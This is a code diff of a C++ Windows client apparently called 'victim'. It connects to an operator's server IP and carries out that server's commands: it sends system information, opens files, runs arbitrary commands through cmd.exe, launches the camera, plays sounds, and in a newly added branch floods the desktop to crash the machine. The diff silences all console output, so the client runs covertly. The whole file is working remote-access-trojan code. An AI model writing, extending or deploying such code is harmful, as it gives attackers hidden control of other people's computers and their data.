@@ -14,7 +14,7 @@
 
 int main(int argc, char* argv[]) {
     if(argc < 2) {
-        std::cout << ERROR_PREFIX << " Incorrect usage, please use: \033[32m./victim IP\033[0m" << std::endl;
+        //std::cout << ERROR_PREFIX << " Incorrect usage, please use: \033[32m./victim IP\033[0m" << std::endl;
         return 1;
     }
     WSADATA wsa;
@@ -22,19 +22,19 @@ int main(int argc, char* argv[]) {
     int WSASuccess;
     WSASuccess = WSAStartup(MAKEWORD(2, 2), &wsa);
     if(WSASuccess != 0) {
-        std::cout << ERROR_PREFIX << " WSAStartup failed\n";
+        //std::cout << ERROR_PREFIX << " WSAStartup failed\n";
     } else {
-        std::cout << SUCCESS_PREFIX << " WSAStartup created\n";
+        //std::cout << SUCCESS_PREFIX << " WSAStartup created\n";
     }
 
     int sock;
     sock = socket(AF_INET, SOCK_STREAM, 0);
     if(sock == -1) {
-        std::cout << ERROR_PREFIX << " Socket failed\n";
+        //std::cout << ERROR_PREFIX << " Socket failed\n";
         WSACleanup();
         return 1;
     } else {
-        std::cout << SUCCESS_PREFIX << " Socket created\n";
+        //std::cout << SUCCESS_PREFIX << " Socket created\n";
     }
 
     sockaddr_in serverAddress;
@@ -45,19 +45,19 @@ int main(int argc, char* argv[]) {
     int ip;
     ip = inet_pton(AF_INET, serverip.c_str(), &serverAddress.sin_addr); 
     if(ip < 1) {
-        std::cout << ERROR_PREFIX << " Invalid IP address\n";
+        //std::cout << ERROR_PREFIX << " Invalid IP address\n";
         return 1;
     }
 
     int connectionEstablished;
     connectionEstablished = connect(sock, (sockaddr*)&serverAddress, sizeof(serverAddress));
     if(connectionEstablished == -1) {
-        std::cout << ERROR_PREFIX << " Connection failed\n";
+        //std::cout << ERROR_PREFIX << " Connection failed\n";
         closesocket(sock);
         WSACleanup();
         return 1;
     } else {
-        std::cout << SUCCESS_PREFIX << " Connection established\n";
+        //std::cout << SUCCESS_PREFIX << " Connection established\n";
     }
 
     char buffer[BUFFERSIZE];
@@ -66,16 +66,16 @@ int main(int argc, char* argv[]) {
         int type;
         bytesRec = recv(sock, (char*)&type, sizeof(type), 0);
         if(bytesRec <= 0) {
-            std::cout << ERROR_PREFIX << " Failed to receive type\n";
-            std::cout << SERVER_STATUS_CLOSED;
+            //std::cout << ERROR_PREFIX << " Failed to receive type\n";
+            //std::cout << SERVER_STATUS_CLOSED;
             break;
         }
 
         if(type == TYPE_TEXT) {
             bytesRec = recv(sock, buffer, BUFFERSIZE, 0);
             if(bytesRec <= 0) {
-                std::cout << ERROR_PREFIX << " Failed to receive type\n";
-                std::cout << SERVER_STATUS_CLOSED;
+                //std::cout << ERROR_PREFIX << " Failed to receive type\n";
+                //std::cout << SERVER_STATUS_CLOSED;
                 break;
             }
 
@@ -85,7 +85,7 @@ int main(int argc, char* argv[]) {
             std::string clientMessage = std::string(CONSOLE_PREFIX) + " Client received: " + cmd + "\n";
             bytesSend = send(sock, clientMessage.c_str(), clientMessage.length(), 0);
             if(bytesSend <= 0) {
-                std::cout << ERROR_PREFIX << " Failed to send client message\n";
+                //std::cout << ERROR_PREFIX << " Failed to send client message\n";
             }
         }
         
@@ -93,7 +93,7 @@ int main(int argc, char* argv[]) {
             int error;
             bytesRec = recv(sock, (char*)&error, sizeof(error), 0);
             if(error == 1) {
-                std::cout << ERROR_PREFIX << " Valid file not found\n";
+                //std::cout << ERROR_PREFIX << " Valid file not found\n";
                 continue;
             }
             
@@ -103,43 +103,43 @@ int main(int argc, char* argv[]) {
         if (type == TYPE_INFO) {
             std::string sysInfo = getSystemInfo();
 
-            std::cout << PENDING_PREFIX << " Sending system information...\n";
+            //std::cout << PENDING_PREFIX << " Sending system information...\n";
             bytesSend = send(sock, sysInfo.c_str(), sysInfo.length(), 0);
             if(bytesSend <= 0) {
-                std::cout << ERROR_PREFIX << " Failed to send client information\n";
+                //std::cout << ERROR_PREFIX << " Failed to send client information\n";
             }
 
-            std::cout << SUCCESS_PREFIX << " Sent system information to the server\n";
+            //std::cout << SUCCESS_PREFIX << " Sent system information to the server\n";
         }
 
         if(type == TYPE_EXECUTE) {
             int subtype;
             bytesRec = recv(sock, (char*)&subtype, sizeof(subtype), 0);
             if(bytesRec <= 0) {
-                std::cout << ERROR_PREFIX << " Failed to receive subtype\n";
+                //std::cout << ERROR_PREFIX << " Failed to receive subtype\n";
             }
 
             switch(subtype) {
                 case 1: {
                     bytesRec = recv(sock, buffer, sizeof(buffer), 0);
                     if(bytesRec <= 0) {
-                        std::cout << ERROR_PREFIX << " Failed to receive path\n";
+                        //std::cout << ERROR_PREFIX << " Failed to receive path\n";
                     }
 
                     std::string path(buffer, bytesRec);
-                    std::cout << PENDING_PREFIX << " Opening " << path << "...\n";
+                    //std::cout << PENDING_PREFIX << " Opening " << path << "...\n";
                     HINSTANCE verify = ShellExecuteA(NULL, "open", path.c_str(), NULL, NULL, SW_SHOWMAXIMIZED); // https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-showwindow
 
                     bool shellSuccess = (INT_PTR)verify > 32;
                     if(shellSuccess) {
-                        std::cout << SUCCESS_PREFIX << " " << path << " opened\n"; 
+                        //std::cout << SUCCESS_PREFIX << " " << path << " opened\n"; 
                         std::string toHostPath = std::string(SUCCESS_PREFIX) + " " + path + " opened";
                         bytesSend = send(sock, toHostPath.c_str(), toHostPath.length(), 0);
                         if(bytesSend <= 0) {
-                            std::cout << ERROR_PREFIX << " Failed to send confirmation message\n";
+                            //std::cout << ERROR_PREFIX << " Failed to send confirmation message\n";
                         }
                     } else {
-                        std::cout << ERROR_PREFIX << " " << path << " does not exist\n";
+                        //std::cout << ERROR_PREFIX << " " << path << " does not exist\n";
                         std::string pathDoesNotExist = std::string(ERROR_PREFIX) + " " + path + " does not exist";
                         bytesSend = send(sock, pathDoesNotExist.c_str(), pathDoesNotExist.length(), 0);
                         break;
@@ -151,44 +151,68 @@ int main(int argc, char* argv[]) {
                 case 2: {
                     bytesRec = recv(sock, buffer, sizeof(buffer), 0);
                     if(bytesRec <= 0) {
-                        std::cout << ERROR_PREFIX << " Failed to receive file name\n";
+                        //std::cout << ERROR_PREFIX << " Failed to receive file name\n";
                     }
 
                     std::string fileName(buffer, bytesRec);
-                    std::cout << PENDING_PREFIX << " Executing " << fileName << std::endl;
+                    //std::cout << PENDING_PREFIX << " Executing " << fileName << std::endl;
 
                     HINSTANCE verify = ShellExecuteA(NULL, "open", "cmd.exe", ("/C " + fileName).c_str(), NULL, SW_SHOWMAXIMIZED);
 
                     bool cmdSuccess = (INT_PTR)verify > 32;
                     if(cmdSuccess) {
-                        std::cout << SUCCESS_PREFIX << " " << fileName << " executed\n";
+                        //std::cout << SUCCESS_PREFIX << " " << fileName << " executed\n";
                         std::string toHostFileName = std::string(SUCCESS_PREFIX) + " " + fileName + " executed";
                         bytesSend = send(sock, toHostFileName.c_str(), toHostFileName.length(), 0);
                         if(bytesSend <= 0) {
-                            std::cout << ERROR_PREFIX << " Failed to send execution confirmation\n";
+                            //std::cout << ERROR_PREFIX << " Failed to send execution confirmation\n";
                         }
                     } else {
-                        std::cout << ERROR_PREFIX << " " << fileName << " failed to execute\n";
+                        //std::cout << ERROR_PREFIX << " " << fileName << " failed to execute\n";
                         std::string fileDoesNotExist = std::string(ERROR_PREFIX) + " " + fileName + " does not exist";
                         bytesSend = send(sock, fileDoesNotExist.c_str(), fileDoesNotExist.length(), 0);
                         if(bytesSend <= 0) {
-                            std::cout << ERROR_PREFIX << " Failed to send execution confirmation\n";
+                            //std::cout << ERROR_PREFIX << " Failed to send execution confirmation\n";
                         }
                     }
 
                     break;
                 }
 
-                case 3:
-                bytesRec = recv(sock, buffer, sizeof(buffer), 0);
-                std::cout << PENDING_PREFIX << " Opening camera...\n";
-                if(bytesRec <= 0) {
-                    std::cout << ERROR_PREFIX << " Failed to open camera\n";
+                case 3: {
+                    bytesRec = recv(sock, buffer, sizeof(buffer), 0);
+                    //std::cout << PENDING_PREFIX << " Opening camera...\n";
+                    if(bytesRec <= 0) {
+                        //std::cout << ERROR_PREFIX << " Failed to open camera\n";
+                    }
+
+                    HINSTANCE verify = ShellExecuteA(NULL, "open", "shell:AppsFolder\\Microsoft.WindowsCamera_8wekyb3d8bbwe!App", NULL, NULL, SW_SHOWNORMAL);
+                    if((INT_PTR)verify < 32) {
+                        //std::cout << SUCCESS_PREFIX << " Camera opened\n";
+                    }
+                    break;
                 }
 
-                std::string cmd(buffer, bytesRec);
-                ShellExecuteA(NULL, "open", "shell:AppsFolder\\Microsoft.WindowsCamera_8wekyb3d8bbwe!App", NULL, NULL, SW_SHOWNORMAL);
-                std::cout << SUCCESS_PREFIX << " Camera opened\n";
+                case 4: {
+                    //std::cout << PENDING_PREFIX << " Crashing computer...\n";
+                    if(bytesRec <= 0) {
+                        //std::cout << ERROR_PREFIX << "Failed to crash computer\n";
+                    }
+
+                    char userName[256];
+                    DWORD userNameSize = sizeof(userName);
+                    GetUserNameA(userName, &userNameSize);
+
+                    std::string windowSwitcher = "C:\\Users\\" + std::string(userName) + "\\AppData\\Roaming\\Microsoft\\Internet Explorer\\Quick Launch\\Window Switcher.lnk";
+                    std::string showDesktop = "C:\\Users\\" + std::string(userName) + "\\AppData\\Roaming\\Microsoft\\Internet Explorer\\Quick Launch\\Shows Desktop.lnk";
+
+                    for(int i = 0; i < 1000; i++) {
+                        ShellExecuteA(NULL, "open", windowSwitcher.c_str(), NULL, NULL, SW_SHOW);
+                        ShellExecuteA(NULL, "open", showDesktop.c_str(), NULL, NULL, SW_SHOW);
+                    }
+
+                    break;
+                }
             }
 
         }
@@ -197,7 +221,7 @@ int main(int argc, char* argv[]) {
             int error;
             bytesRec = recv(sock, (char*)&error, sizeof(error), 0);
             if(error == 1) {
-                std::cout << ERROR_PREFIX << " Valid file not found\n";
+                //std::cout << ERROR_PREFIX << " Valid file not found\n";
                 continue;
             }
 
@@ -210,14 +234,14 @@ int main(int argc, char* argv[]) {
                 std::string openFile = "open \"" + path + "\" alias sound";
                 mciSendStringA(openFile.c_str(), NULL, 0, 0);
                 mciSendStringA("play sound", NULL, 0, 0);
-                std::cout << SUCCESS_PREFIX << " Playing " << path << std::endl;
+                //std::cout << SUCCESS_PREFIX << " Playing " << path << std::endl;
             } else {
-                std::cout << ERROR_PREFIX << " " << path << "failed to play\n";
+                //std::cout << ERROR_PREFIX << " " << path << "failed to play\n";
             }
         }
 
         if(type == TYPE_EXIT) {
-            std::cout << SERVER_STATUS_CLOSED;
+            //std::cout << SERVER_STATUS_CLOSED;
             break;
         }
     }
